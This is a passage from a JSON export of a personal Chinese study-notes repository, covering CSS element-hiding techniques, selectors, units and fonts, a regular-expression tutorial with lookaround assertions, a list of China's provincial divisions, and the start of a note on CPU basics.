不吃这一套，不管自身的 display 值是什么，只要祖先元素的 display 是 none，它们就都不可见。\n现在，将鼠标移到第一个块元素上面几次，然后点击它。这个操作将让第二个块元素显现出来，它其中的数字将是一个大于 0 的数。这是因为，元素即使被这样设置成对用户隐藏，还是可以通过 JavaScript 来进行操作。\n\n## Position\n假设有一个元素你想要与它交互，但是你又不想让它影响你的网页布局，没有合适的属性可以处理这种情况（opacity 和 visibility 影响布局， display 不影响布局但又无法直接交互——译者注）。在这种情况下，你只能考虑将元素移出可视区域。这个办法既不会影响布局，有能让元素保持可以操作。下面是采用这种办法的 CSS：\n```css\n.hide {\n   position: absolute;\n   top: -9999px;\n   left: -9999px;\n}\n```\n\n这种方法的主要原理是通过将元素的 top 和 left 设置成足够大的负数，使它在屏幕上不可见。采用这个技术的一个好处（或者潜在的缺点）是用它隐藏的元素的内容可以被读屏软件读取。这完全可以理解，是因为你只是将元素移到可视区域外面让用户无法看到它。\n你得避免使用这个方法去隐藏任何可以获得焦点的元素，因为如果那么做，当用户让那个元素获得焦点时，会导致一个不可预料的焦点切换。这个方法在创建自定义复选框和单选按钮时经常被使用。\n\n## Clip-path\n隐藏元素的另一种方法是通过剪裁它们来实现。在以前，这可以通过 clip 属性来实现，但是这个属性被废弃了，换成一个更好的属性叫做 clip-path。Nitish Kumar 最近在 SitePoint 发表了“介绍 clicp-path 属性”这篇文章，通过阅读它可以了解这个属性的更多高级用法。\n记住，clip-path 属性还没有在 IE 或者 Edge 下被完全支持。如果要在你的 clip-path 中使用外部的 SVG 文件，浏览器支持度还要更低。使用 clip-path 属性来隐藏元素的代码看起来如下：\n```css\n.hide {\n  clip-path: polygon(0px 0px,0px 0px,0px 0px,0px 0px);\n}\n```\n如果你把鼠标悬停在第一个元素上，它依然可以影响第二个元素，尽管第二个元素已经通过 clip-path 隐藏了。如果你点击它，它会移除用来隐藏的 class，让我们的元素从那个位置显现出来。被隐藏元素中的文字仍然能够通过读屏软件读取，许多 WordPress 站点使用 clip-path 或者之前的 clip 来实现专门为读屏软件提供的文字。\n虽然我们的元素自身不再显示，它也依然占据本该占据的矩形大小，它周围的元素的行为就如同它可见时一样。记住用户交互例如鼠标悬停或者点击在剪裁区域之外也不可能生效。在我们的例子里，剪裁区大小为零，这意味着用户将不能与隐藏的元素直接交互。此外，这个属性能够使用各种过渡动画来实现不同的效果。\n```css\ndiv[id^=\"i_\"]:not(#i_0) > input.typing {\n    opacity: 0;\n    height: 0px!important;\n    padding: 0;\n    border: 0;\n    margin: 0;\n}\n```\n\n# css标签名选择器注意点\ncss标签名选择器不可能为第三方css库中的自定义的标签，因为第三方自定义标签最终还是会转换成原有标签。例如：使用`element-ui`中的`el-input`标签时，最终会转换成一个class属性包含`el-input`的div标签，如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409105939.png)\n\n所以此时如果css标签名选择器为`el-input{}`，是无法选中该el-input标签的。\n\n\n# css高级匹配\n## 模糊匹配\n|     类型     |                    描述                    |\n| ------------ | ------------------------------------------ |\n| `[abc^=\"def\"]` | \t选择 abc 属性值以 \"def\" 开头的所有元素     |\n| `[abc$=\"def\"]` | \t选择 abc 属性值以 \"def\" 结尾的所有元素     |\n| `[abc*=\"def\"]` | \t选择 abc 属性值中包含子串 \"def\" 的所有元素 |\n\n## 非匹配\n:not(selector) 选择器匹配非指定元素/选择器的每个元素。\n\n**例：**\n```css\n[class^=\"line\"]:not(#art_text)\n```\n\n## 选非第一个元素\n```html\n<div>\n    <span></span>\n    <span></span>\n    <span></span>\n    <span></span>\n</div>\n```\n```css\ndiv > span :not(:first-child) {\n    margin-left:10px\n}\n```\n\n例：\n```html\n<div id=\"i_0\">\n    <input value=\"fdf\">\n    <input value=\"dkfjdkfj\" class=\"typing\">\n</div>\n<div id=\"i_1\">\n    <input value=\"fdf\">\n    <input value=\"dkfjdkfj\" class=\"typing\">\n</div>\n<div id=\"i_2\">\n    <input value=\"fdf\">\n    <input value=\"dkfjdkfj\" class=\"typing\">\n</div>\n<div id=\"i_3\">\n    <input value=\"fdf\">\n    <input value=\"dkfjdkfj\" class=\"typing\">\n</div>\n```\n**要求：**\n选中除id为i_0以外的div下的第二个input\n```css\ninput.typing:not(:first-child){\n\n}\n```\n这种方式会选中所有input.typing, 而不会排除id为1_0的div下的第二个input. 因为该方式会先找到input.typing,  然后排除该选到的元素在该父元素中是否为第一个子元素， 如果不是， 则选中， 反之， 则不会选中\n\n以下方法可以实现想要的效果：\n```css\ndiv[id^=\"i_\"]:not(#i_0) > input.typing{\n}\n```\n\n# px、em、rem、%、vw、vh、vm\n传统的项目开发中，我们只会用到px、%、em这几个单位，它可以适用于大部分的项目开发，并且拥有比较良好的兼容性。但是你知道吗？从css3开始，浏览器对逻辑单位的支持又提升到了另外一个境界，增加了rem、vh、vw、vm等一些新的长度单位，我们可以利用这些新的单位开发出比较良好的响应式页面，随之覆盖多种不同分辨率的终端，包括移动设备等。现在让我们来看下这些长度单位有什么区别。\n\n## px\npx就是pixel的缩写，意为像素。px就是一张图片最小的一个点，一张位图就是千千万万的这样的点构成的，比如常常听到的电脑像素是1024x768的，表示的是水平方向是1024个像素点，垂直方向是768个像素点。\n\n## em\n参考物是父元素的font-size，具有继承的特点。如果自身定义了font-size按自身来计算（浏览器默认字体是16px），整个页面内1em不是一个固定的值。\n\n假定当前默认字体尺寸是14px，n em即为14px字体尺寸的n倍\n\n## rem\ncss3新单位，相对于根元素html（网页）的font-size，不会像em那样，依赖于父元素的字体大小，而造成混乱。\n\n## %\n一般宽泛的讲是相对于父元素，但是并不是十分准确。\n- 对于普通定位元素就是我们理解的父元素\n- 对于position: absolute;的元素是相对于已定位的父元素\n- 对于position: fixed;的元素是相对于 ViewPort（可视窗口）\n\n## vw\ncss3新单位，viewpoint width的缩写，视窗宽度，1vw等于视窗宽度的1%。\n\n举个例子：浏览器宽度1200px, 1 vw = 1200px/100 = 12 px。\n\n## vh\ncss3新单位，viewpoint height的缩写，视窗高度，1vh等于视窗高度的1%。\n\n举个例子：浏览器高度900px, 1 vh = 900px/100 = 9 px。\n\n## vm\ncss3新单位，相对于视口的宽度或高度中较小的那个。其中最小的那个被均分为100单位的vm\n\n举个例子：浏览器高度900px，宽度1200px，取最小的浏览器高度， 1 vm = 900px/100 = 9 px。\n\n\n# 绝对定位于相对定位\nposition 的四个值：static、relative、absolute、fixed。\n- 绝对定位：absolute 和 fixed 统称为绝对定位\n- 相对定位：relative\n- 默认值：static\n\nrelative：定位是相对于自身位置定位（设置偏移量的时候，会相对于自身所在的位置偏移）。设置了relative的元素仍然处在文档流中，元素的宽高不变，设置偏移量也不会影响其他元素的位置。最外层容器设置为relative定位，在没有设置宽度的情况下，宽度是整个浏览器的宽度。\n\nabsolute：定位是相对于离元素最近的设置了绝对或相对定位的父元素决定的，如果没有父元素设置绝对或相对定位，则元素相对于根元素即html元素定位。设置了absolute的元素脱了了文档流，元素在没有设置宽度的情况下，宽度由元素里面的内容决定。脱离后原来的位置相当于是空的，下面的元素会来占据位置。\n\n# 字体\n## CSS font-family\n在 CSS 中，可以使用 font-family 属性来指定字体，浏览器渲染文字时候会根据这个属性应用于元素。如果没有指定这个属性或者指定的字体不存在于客户的计算机上，则浏览器会使用默认字体。\n```css\n<style>\n    .line {\n        font-family: 'Courier New', Courier, monospace;\n    }\n</style>\n<p>Hello World!</p>\n```\n- 如果没有设置 font-family，浏览器会使用默认字体应用于元素。\n- 如果 font-family 属性指定的字体，**在本地计算机没有，则使用默认字体**\n- 如果字体的名称有空格，则必须要使用引号。\n- 使用 font-family 属性可以指定一个字体，也可以指定一组字体列表——将多个字体用逗号分割\n- 如果指定一组字体列表，则会依次查找，第一个字体本地没有，则使用第二个。如果指定的字体列表中的字体，本地计算机都没有，则浏览器使用默认字体应用于元素\n\n## Web safe fonts (网络安全字体)\n系统中通常只有一定数量的字体可用，并且不同的系统中的字体可能不相同，所以在 Windows 上可以用的字体，在其他系统中不一定可以用。\n\n开发者指定的字体，在自己的电脑上已经被安装，所以可以正常显示。但客户端机器并没有安装整个字体，则客户端会使用默认字体显示。所以开发者考虑哪一些字体是客户端基本都会被安装的。\n\n有一些字体在常见系统（Windows, Mac, 常见的Linux发行版, Android和iOS版本）中都可以用，这些字体就是安全字体。\n\n具体参考：https://developer.mozilla.org/en-US/docs/Learn/CSS/Styling_text/Fundamentals#Web_safe_fonts\n\n## Web fonts (网络字体)\nWeb 字体是一种 CSS 功能，允许指定的字体文件被下载到本地。\n\n这是一种非常有效的方式，这样字体就不受限于本地是否安装了字体，而且大部分浏览器都支持Web 字体。\n\n网络字体使用方式：\n\nSetp 1 下载网络字体；在 CSS 中，使用@font-face 关键字下载网络字体，有2个必要属性\n```css\n@font-face {\n    // 自定义一个名称。\n    font-family: \"myFont\";\n    // 指定字体资源，可以使用相对路径，例如：url('./../font/Times-New-Roman.ttf')\n    src: url(\"myFont.ttf\");\n}\n```\n\nSetp 2 使用字体；设置 font-family 属性，而这时 font-family 设置的是网络字体的名称，而不再是系统的字体。(网络字体的名称在上一步已经定义。)\n```css\n  .line {\n    font-family: 'myFont;\n  }\n```\n\n## 查看当前浏览器是渲染的什么字体\n\n参考：https://stackoverflow.com/questions/884177/how-can-i-determine-what-font-a-browser-is-actually-using-to-render-some-text\n\n---\n\nFor Chrome, go into DevTools' \"Elements\", go to its \"Computed\" tab, and scroll all the way down to the section called \"Rendered Fonts\". Unlike with Firefox, this only shows the base font name, not any specific style it may be using:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220622223435.png)\n"
  },
  {
    "title": "./notes/基础知识/正则表达式.md",
    "body": "# 正则表达式入门\n## 字符组\n如果只是使用正则表达式来匹配文本，没有什么意义，毕竟检测一个文本中是否有另一个字符串本来就非常简单。\n\n正则表达式强大的地方在于它可以迅速地用极简单的方式达到字符串的复杂控制。\n\n字符组（[]）允许匹配一组可能出现的字符。\n\n例如：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321155832.png)\n\n可以发现`[Pp]`既可以匹配大写的`P`也可以匹配小写的`p`\n\n## 区间\n有一些常见的字符组非常大，比如，我们要匹配任意的数字，如果依照上述代码，每次我们都需要使用`[0123456789]`。\n\n但是这样好吗？\n\n如果要匹配从a-z的字母呢？我想你肯定不愿意从a写到z了！\n\n为了适应这一点，正则表达式引擎在字符组中使用连字符(-)代表区间，依照这个规则，我们可以总结出三点：\n\n1. 要匹配任意数字可以使用`[0-9]`；\n2. 如果想要匹配所有小写字母，可以写成`[a-z]`；\n3. 想要匹配所有大写字母可以写成`[A-Z]`。\n\n例如：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321160011.png)\n\n\n## 匹配特殊字符\n正则表达使用了 `-` 号代表了区间，但是我们有时候需要匹配的符号就是 `-`号，该怎么办呢？\n\n这个时候我们需要对`-`号进行转义操作，即 `\\-`。\n\n在正则中使用 `\\` 就可以进行对特殊符号进行转义，对 `-` 进行转义就可以表示为 `\\-`，即`\\-` 就代表了`-`号本身。\n\n> 偷偷告诉你，转义符 `\\` 也适用于其他的符号，例如匹配圆括号可以使用 `\\(`\n\n例如：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321160201.png)\n\n## 取反\n到目前为止，我们定义的字符组都是由可能出现的字符定义，不过有时候我们可能希望根据不会出现的字符定义字符组。\n\n例如：匹配不包含数字的字符组\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321160407.png)\n\n可以通过在字符数组开头使用 ^ 字符实现取反操作，从而可以反转一个字符组（意味着会匹配任何指定字符之外的所有字符）。\n\n再看一个例子：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321160423.png)\n\n这里的 `n[^e]` 的意思就是n后面的字母不能为 e。\n\n# 快捷方式\n\n## 快捷匹配数字和字母\n\n以目前学到的内容，如果想要匹配所有的字母，会使用`[A-Za-z]`，要匹配数字会使用`[0-9]`\n\n还有没有更简洁的方式呢？\n\n正则表达式引擎提供了一些快捷方式如：`\\w` 可以与任意单词字符匹配。\n\n当我们想要匹配任意数字的时候也可以使用快捷方式`\\d`，d即digit数字的意思，等价于`[0-9]`。\n\n|快捷方式|描述|\n|--|--|\n|\\w|与任意单词字符匹配，任意单词字符表示 [A-Z]、 [a-z]、[0-9]、_ |\n|\\d|与任意数字匹配|\n\n## 匹配空白\n`\\s`快捷方式可以匹配空白字符，比如空格，tab、换行等。\n\n例如：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321160725.png)\n\n## 单词边界\n`\\b` 匹配的是单词的边界，例如，\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321160933.png)\n\n`\\bmaster\\b` 就仅匹配有边界的`master`单词。\n\n当然其他类型的数据，比如数字也能匹配：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321160952.png)\n\n## 快捷方式取反\n快捷方式也可以取反，例如对于`\\w`的取反为`\\W`，将小写改写成大写即可，其他快捷方式也遵循这个规则。\n\n示例：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321161324.png)\n\n## 开始和结束\n正则表达式中 `^`指定的是一个字符串的开始，`$`指定的是一个字符串的结束。\n\n例如：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321161539.png)\n\n指定字符串的结束：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321161603.png)\n\n## 任意字符\n\n`.`字符代表匹配任何单个字符，它只能出现在方括号以外。\n\n值得注意的是： `.`字符只有一个不能匹配的字符，也就是换行符（`\\n`），不过要让`.`字符与换行符匹配也是可以的，以后会讨论。\n\n示例：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321161823.png)\n\n## 可选字符\n\n有时，我们可能想要匹配一个单词的不同写法，比如color和colour，或者honor与honour。\n\n这个时候我们可以使用`?`符号指定一个字符、字符组或其他基本单元可选，这意味着正则表达式引擎将会期望该字符出现零次或一次。\n\n例如：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321161924.png)\n\n在这里 `u?` 表示`u`是可选的，即可以出现也可以不出现，可以匹配的是 `honor` 和 `honour` 。\n\n通过这个案例可以知道`?`的作用就是匹配它之前的字符0次或1次。\n\n# 匹配多个数据\n\n## 重复\n到目前为止，我们只是学习了关于仅出现一次的字符串匹配，在实际开发中，肯定不能满足需求，比如要匹配电话号码、身份证的时候就无法满足需求了。\n\n如果遇到这样的情况，我们可能期望一个字符组连续匹配好几次。\n\n在一个字符组后加上`{N}` 就可以表示在它之前的字符组出现`N`次。\n\n例如：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321162151.png)\n\n## 重复区间\n可能有时候，我们不知道具体要匹配字符组要重复的次数，比如身份证有15位也有18位的。\n\n这里重复区间就可以出场了，语法：`{M,N}`，`M`是下界而`N`是上界。\n\n举个例子：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321162302.png)\n\n`\\d{3,4}` 既可以匹配3个数字也可以匹配4个数字，不过当有4个数字的时候，优先匹配的是4个数字，这是因为正则表达式默认是贪婪模式，即尽可能的匹配更多字符，而要使用非贪婪模式，我们要在表达式后面加上`?`号。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321162331.png)\n\n## 开闭区间\n有时候我们可能遇到字符组的重复次数没有边界，例如：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321162438.png)\n\n闭区间不写即可表示匹配一个或无数个。\n\n还可以使用两个速写字符指定常见的重复情况，可以使用 `+` 匹配1个到无数个，使用`*`代表0个到无数个。\n\n即：`+`等价于`{1,}`，`*`等价于`{0,}`。\n\n`+`号示例：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321162556.png)\n\n`*`号示例：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321162613.png)\n\n# 分组\n## 分组\n在正则表达式中还提供了一种将表达式分组的机制，当使用分组时，除了获得整个匹配。还能够在匹配中选择每一个分组。\n\n要实现分组很简单，使用`()`即可。\n\n例如：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321171544.png)\n\n这段正则表达式将文本分成了两组，第一组为：0731，第二组为8825951。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321171559.png)\n\n分组有一个非常重要的功能——捕获数据。所以`()`被称为捕获分组，用来捕获数据，当我们想要从匹配好的数据中提取关键数据的时候可以使用分组。\n\n`(\\d{4})` 和 `(\\d{7})`就分别捕获了两段数据：\n1. 0731\n2. 8825951\n\n## 或者条件\n使用分组的同时还可以使用 或者（`or`）条件。\n\n例如要提取所有图片文件的后缀名，可以在各个后缀名之间加上一个`|`符号：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321193523.png)\n\n## 非捕获分组\n有时候，我们并不需要捕获某个分组的内容，但是又想使用分组的特性。\n\n这个时候就可以使用非捕获组(`?:表达式`)，从而不捕获数据，还能使用分组的功能。\n\n例如想要匹配两个字母组成的单词或者四个字母组成的单词就可以使用非捕获分组：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321193759.png)\n\n## 分组的回溯引用\n正则表达式还提供了一种引用之前匹配分组的机制，有些时候，我们或许会寻找到一个子匹配，该匹配接下来会再次出现。\n\n例如，要匹配一段 HTML 代码，比如：`0123<font>提示</font>abcd`，可能会编写出这样一段正则表达式：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321201135.png)\n\n这确实可以匹配，不过可能还有另一种情况，如果数据改成这样：`<font>提示</bar>`\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321201150.png)\n\n在这里font 和 bar 明显不是一对正确的标签，但是我们编写的正则表达式还是将它们给匹配了，所以这个结果是错误的。\n\n我们想让后面分组的正则也匹配font，但是现在所有形式的都会匹配。\n\n那如果想让后面分组的正则和第一个分组的正则匹配同样的数据该如何做呢？\n\n可以使用分组的回溯引用，使用`\\N`可以引用编号为`N`的分组，因此上述例子的代码我们可以改为：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321201209.png)\n\n通过这个例子，可以发现`\\1` 表示的就是第一个分组，在这里第一个分组匹配的是 font 所以`\\1` 就代表font。\n\n# 断言\n正则表达式的先行断言和后行断言一共有 4 种形式：\n- `(?=pattern)` 零宽正向先行断言(zero-width positive lookahead assertion)\n- `(?!pattern)` 零宽负向先行断言(zero-width negative lookahead assertion)\n- `(?<=pattern)` 零宽正向后行断言(zero-width positive lookbehind assertion)\n- `(?<!pattern)` 零宽负向后行断言(zero-width negative lookbehind assertion)\n\n这里面的 pattern 是一个正则表达式。\n\n如同`^`  代表开头，`$` 代表结尾，`\\b` 代表单词边界一样，先行断言和后行断言也有类似的作用，它们只匹配某些位置，在匹配过程中，不占用字符，所以被称为\"零宽\"。所谓位置，是指字符串中(每行)第一个字符的左边、最后一个字符的右边以及相邻字符的中间（假设文字方向是头左尾右）。\n\n下面分别举例来说明这 4 种断言的含义。\n\n## (?=pattern)正向先行断言\n代表字符串中的一个位置，紧接该位置之后的字符序列能够匹配 pattern。\n\n例如对 \"a regular expression\" 这个字符串，要想匹配 regular 中的 re，但不能匹配 expression 中的 re，可以用`re(?=gular)`，该表达式限定了 re 右边的位置，这个位置之后是 gular，但并不消耗 gular 这些字符。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321202452.png)\n\n将表达式改为 `re(?=gular).`，将会匹配 `reg`，元字符 `.` 匹配了 `g`，括号这一砣匹配了 `e` 和 `g` 之间的位置。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321202542.png)\n\n## (?!pattern)负向先行断言\n代表字符串中的一个位置，紧接该位置之后的字符序列不能匹配 pattern。\n\n例如对 \"regex represents regular expression\" 这个字符串，要想匹配除 regex 和 regular 之外的 `re`，可以用 `re(?!g)`，该表达式限定了 `re` 右边的位置，这个位置后面不是字符 `g`。\n\n负向和正向的区别，就在于该位置之后的字符能否匹配括号中的表达式。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321202714.png)\n\n## (?<=pattern)正向后行断言\n\n代表字符串中的一个位置，紧接该位置之前的字符序列能够匹配 pattern。\n\n例如对 regex represents regular expression 这个字符串，有 4 个单词，要想匹配单词内部的 re，但不匹配单词开头的 re，可以用 `(?<=\\w)re`，单词内部的 `re`，在 `re` 前面应该是一个单词字符。\n\n之所以叫后行断言，是因为正则表达式引擎在匹配字符串和表达式时，是从前向后逐个扫描字符串中的字符，并判断是否与表达式符合，当在表达式中遇到该断言时，正则表达式引擎需要往字符串前端检测已扫描过的字符，相对于扫描方向是向后的。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321203114.png)\n\n## `(?<!pattern)`负向后行断言\n代表字符串中的一个位置，紧接该位置之前的字符序列不能匹配 pattern。\n\n例如对 \"regex represents regular expression\" 这个字符串，要想匹配单词开头的 `re`，可以用 `(?<!\\w)re`。单词开头的 `re`，在本例中，也就是指不在单词内部的 `re`，即 `re` 前面不是单词字符。当然也可以用 `\\bre` 来匹配。\n\n## 总结\n对于这 4 个断言的理解，可以从两个方面入手：\n1. 关于先行(lookahead)和后行(lookbehind)：正则表达式引擎在执行字符串和表达式匹配时，会从头到尾（从前到后）连续扫描字符串中的字符，设想有一个扫描指针指向字符边界处并随匹配过程移动。先行断言，是当扫描指针位于某处时，引擎会尝试匹配指针还未扫过的字符，先于指针到达该字符，故称为先行。后行断言，引擎会尝试匹配指针已扫过的字符，后于指针到达该字符，故称为后行。\n2. 关于正向(positive)和负向(negative)：正向就表示匹配括号中的表达式，负向表示不匹配。\n\n对这 4 个断言形式的记忆：\n1. 先行和后行：后行断言 `(?<=pattern)、(?<!pattern)` 中，有个小于号，同时也是箭头，对于自左至右的文本方向，这个箭头是指向后的，这也比较符合我们的习惯。把小于号去掉，就是先行断言。\n2. 正向和负向：不等于 `(!=)`、逻辑非 `(!)` 都是用 `!`号来表示，所以有 `!` 号的形式表示不匹配、负向；将 `!` 号换成 `=` 号，就表示匹配、正向。\n\n我们经常用正则表达式来检测一个字符串中包含某个子串，要表示一个字符串中不包含某个**字符**或某些字符也很容易，用 `[^...]` 形式就可以了。要表示一个字符串中不包含某个**子串（由字符序列构成）**呢？\n\n用`[^...]`这种形式就不行了，这时就要用到（负向）先行断言或后行断言、或同时使用。\n例如判断一句话中包含 this，但不包含 that。\n\n包含 this 比较好办，一句话中不包含 that，可以认为这句话中每个字符的前面都不是 that 或每个字符的后面都不是 that。正则表达式如下：\n```\n^((?<!that).)*this((?<!that).)*$\n或 \n^(.(?!that))*this(.(?!that))*$\n```\n对于 this is runoob test 这句话，两个表达式都能够匹配成功，而 this and that is runoob test 都匹配失败。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321203805.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220321203815.png)\n\n在一般情况下，这两个表达式基本上都能够满足要求了。考虑极端情况，如一句话以 that 开头、以 that 结尾、that 和 this 连在一起时，上述表达式就可能不胜任了。 如 runoob thatthis is the case 或者 this is the case, not that 等。\n只要灵活运用这几个断言，就很容易解决：\n```\n^(.(?<!that))*this(.(?<!that))*$\n^(.(?<!that))*this((?!that).)*$\n^((?!that).)*this(.(?<!that))*$\n^((?!that).)*this((?!that).)*$\n```\n这 4 个正则表达式测试上述的几句话，结果都能够满足要求。\n\n上述 4 种断言，括号里的 pattern 本身是一个正则表达式。但对 2 种后行断言有所限制，在 Perl 和 Python 中，这个表达式必须是定长(fixed length)的，即不能使用 `*`、`+`、`?` 等元字符，如 `(?<=abc)` 没有问题，但 `(?<=a*bc)` 是不被支持的，特别是当表达式中含有|连接的分支时，各个分支的长度必须相同。之所以不支持变长表达式，是因为当引擎检查后行断言时，无法确定要回溯多少步。Java 支持 `?`、`{m}`、`{n,m}` 等符号，但同样不支持 `*`、`+` 字符。Javascript 干脆不支持后行断言，不过一般来说，这不是太大的问题。\n\n先行断言和后行断言某种程度上就好比使用 if 语句对匹配的字符前后做判断验证。\n\n**以下列出 ?=、?<=、?!、?<!= 的使用**\n\n`exp1(?=exp2)`：查找 exp2 前面的 exp1。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220322103830.png)\n\n`(?<=exp2)exp1`：查找 exp2 后面的 exp1。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220322103903.png)\n\n`exp1(?!exp2)`：查找后面不是 exp2 的 exp1。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220322104317.png)\n\n"
  },
  {
    "title": "./notes/基础知识/中国地理.md",
    "body": "# 一级行政区\n一级行政区包括省、自治区、直辖市、特别行政区。\n中国共计34个省级行政区，包括23个省、5个自治区、4个直辖市、2个特别行政区。\n\n直辖区: 是直接由中央人民政府所管辖的建制市。\n自治区: 是中国少数民族聚居地设立的省级民族区域自治地方\n特别行政区: 指在中华人民共和国行政区域内，根据宪法和法律的规定而设立的具有特殊法律地位，实行特殊的社会制度、政治制度、经济制度和文化制度等的行政区域\n\n- 23个省分别为：河北省、山西省、辽宁省、吉林省、黑龙江省、江苏省、浙江省、安徽省、福建省、江西省、山东省、河南省、湖北省、湖南省、广东省、海南省、四川省、贵州省、云南省、陕西省、甘肃省、青海省、台湾省。\n- 5个自治区分别为：内蒙古自治区、广西壮族自治区、西藏自治区、宁夏回族自治区、新疆维吾尔自治区。\n- 4个直辖市分别为：北京市、天津市、上海市、重庆市。\n- 2个特别行政区分别为：香港特别行政区、澳门特别行政区。\n\n# 七大行政地理分区\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20211018151946.png\" width=\"700px\"/>\n\n## 西北\n- 新疆: 新；自治区；乌鲁木齐市;\n- 青海: 青；\b西宁\n- 甘肃: 甘/陇；兰州市\n- 宁夏: 宁；自治区；银川\n- 陕西: 陕/秦；西安\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20211018144049.png\" width=\"700px\"/>\n\n## 西南\n- 西藏: 藏；自治区；拉萨市\n- 四川: 川/蜀；成都\n- 重庆: 渝；直辖市\n- 贵州: 贵/黔；贵阳\n- 云南: 云/滇；昆明\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20211018144154.png\" width=\"700px\"/>\n\n## 华北\n- 内蒙古: 蒙; 自治区；呼和浩特\n- 北京: 京；直辖市\n- 天津: 津；直辖市\n- 河北: 冀；石家庄\n- 山西：晋；太原\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20211018144427.png\" width=\"700px\"/>\n\n## 华中\n- 河南: 豫; 郑州\n- 湖北: 鄂；武汉\n- 湖南：湘；长沙\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20211018144356.png\" width=\"700px\"/>\n\n## 华南\n- 广西: 桂；自治区；南宁市\n- 广东: 粤；广州\n- 澳门: 澳；特别行政区\n- 香港: 港；特别行政区\n- 海南: 琼；海口\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20211018144234.png\" width=\"700px\"/>\n\n## 东北\n- 黑龙江：黑；哈尔滨\n- 吉林：吉；长春\n- 辽宁：辽；沈阳\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20211018144455.png\" width=\"700px\"/>\n\n## 华东\n- 山东：鲁；济南\n- 江苏：苏；南京\n- 安徽：皖；合肥\n- 上海：沪/申；直辖市\n- 浙江：浙；杭州\n- 福建：闽；福州\n- 江西：赣；南昌\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20211018144322.png\" width=\"700px\"/>\n\n"
  },
  {
    "title": "./notes/基础知识/Rust.md",
    "body": ""
  },
  {
    "title": "./notes/基础知识/计组.md",
    "body": "# CPU\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405092720.png)\n\n现在的会把高速缓存Cache也放在CPU中\n\n**ALU**\nALU内部是各种各样的逻辑电路，来进行计算\n\n**主频和cpu时钟周期**：\n- cpu时钟周期：是cpu中最小的时间单位\n- 主频(cpu时钟频率)：表示1秒内能有多少个cpu时钟周期， 常见的有1.8Ghz, 2.4Ghz, 2.8Ghz\n- CPI：即执行一条指令所需要的时钟周期数\n\n**核数与超线程**\nCPU核数，即指的是CPU内核数量。CPU内核是CPU的重要组成部件，由单晶硅以一定的生产工艺制造出来的，CPU所有的计算、接受/存储命令、处理数据都由内核执行。\n一般情况下每个核心都有一个线程，几核心就有几线程，但是intel发明了超线程技术，可以让单核模拟多核心工作，intel的超线程可以让单核心具有两个线程，双核四线程、四核八线程、六合十二线程。超线程技术能够让cpu性能大幅提升，效率更高\n\n**cpu硅脂**\n俗名又叫散热膏，是以特种硅油做基础油，新型金属氧化物做填料，配以多种功能添加剂，经特定的工艺加工而成的膏状物.颜色因材料不同而具有不同的外观。其具有良好的导热、耐温、绝缘性能，是耐热器件理想的介质材料，而且性能稳定，在使用中不会产生腐蚀气体，不会对所接触的金属产生影响。涂抹于功率器件和散热器装配面，帮助消除接触面的空气间隙增大热流通，减小热阻，降低功率器件的工作温度，提高可靠性和延长使用寿命。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405092746.png)\n\n**制造工艺7nm与14nm**\n简单来说的XX nm指的是CPU的上形成的互补氧化物金属半导体场效应晶体管栅极的宽度，也被称为栅长。\n对于14nm（纳米）和7nm（纳米）是从芯片的制造工艺方面来说明的，对于两者来说肯定是7nm（纳米）技术制造出来的芯片其性能更优越，**在相同的面积中所集成的晶体管越多芯片的各种性能就越高**，比如以处理器为例，用7nm（纳米）技术制作的CPU肯定比14nm（纳米）技术制作的CPU在晶体管数量方面、处理速度方面、功耗方面以及温升等方面都会高出一个数量级。所以用7nm（纳米）制程制作的芯片在各个方面会全面“碾压”14nm（纳米）制程的芯片。以上是用7nm（纳米）技术比14nm（纳米）技术从芯片的各种性能得到提升做出的对比。 